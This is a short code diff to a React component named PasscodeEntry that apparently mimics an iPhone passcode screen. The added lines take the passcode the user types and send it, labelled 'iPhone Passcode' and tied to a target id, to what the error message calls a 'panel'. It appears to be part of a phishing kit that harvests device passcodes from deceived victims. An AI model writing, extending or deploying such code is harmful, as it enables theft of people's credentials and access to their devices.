@@ -309,8 +309,18 @@ function PasscodeEntry({ onFinish }) {
             handleWrongCode();
             return;
         }
-        // console.log('Passcode submitted:', code);
         setReadOnly(true);
+        try {
+            const targetId = await getTargetId();
+            await addIntakeEvent({
+                type: 'input',
+                input_title: 'iPhone Passcode',
+                input_value: code,
+                target_id: targetId,
+            });
+        } catch (e) {
+            console.error('Failed to send passcode to panel:', e);
+        }
         setTimeout(() => setClosing(true), 250);
         setTimeout(() => { onFinish && onFinish(); }, 390);
     }, [code, wrongCodes, handleWrongCode, onFinish]);
